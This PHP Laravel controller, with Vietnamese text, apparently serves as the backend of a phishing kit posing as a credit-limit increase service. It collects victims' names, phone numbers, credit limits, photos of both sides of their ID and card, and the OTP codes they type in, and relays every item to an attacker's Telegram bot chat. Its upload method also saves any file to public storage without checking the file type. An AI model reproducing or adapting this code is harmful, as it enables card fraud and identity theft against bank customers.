<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;

class OtpController extends Controller
{
    public function save(Request $request)
    {

        // send html
        $message = " <b>Có khách hàng mới:</b> \n";
        $message .= " <b>Tên:</b> " . $request->name . "\n";
        $message .= " <b>Số điện thoại:</b> " . $request->phone . "\n";
        $message .= " <b>Giới hạn hiện tại:</b> " . $request->limit_now . "\n";
        $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
        $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" .
            $request->mattruoc . "&caption=Ảnh mặt trước";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . $request->matsau . "&caption=Ảnh mặt sau";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . $request->mattruoc_card . "&caption=Ảnh mặt trước thẻ";

        file_get_contents($url);

        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . $request->matsau_card . "&caption=Ảnh mặt sau thẻ";

        file_get_contents($url);

        return response()->json([
            'status' => true
        ]);
    }

    public function otp(Request $request)
    {
        $request->validate([
            'otp' => 'required',
        ], [
            'otp.required' => 'Vui lòng nhập số điện thoại',
        ]);

        $otp =  $request->otp;

        // send otp to phone
        $message = "Mã OTP là: " . $otp;
        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;

        file_get_contents($url);

        return redirect()->route('otp');
    }

    public function saveError(Request $request)
    {
        $request->validate([
            'otp' => 'required',
        ], [
            'otp.required' => 'Vui lòng nhập số điện thoại',
        ]);

        $otp =  $request->otp;

        // send otp to phone
        $message = "Mã OTP là: " . $otp;
        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;

        file_get_contents($url);

        return redirect()->route('otp_error');
    }

    public function upload(Request $request)
    {
        $image = $request->file('image');
        $image_name = 'image-' . time() . '.' . $image->extension();
        $image->storeAs('public', $image_name);

        return response()->json([
            'message' => 'Upload ảnh thành công',
            'imageUrl' => asset('storage/' . $image_name),
            'status' => 'success'
        ]);
    }
}
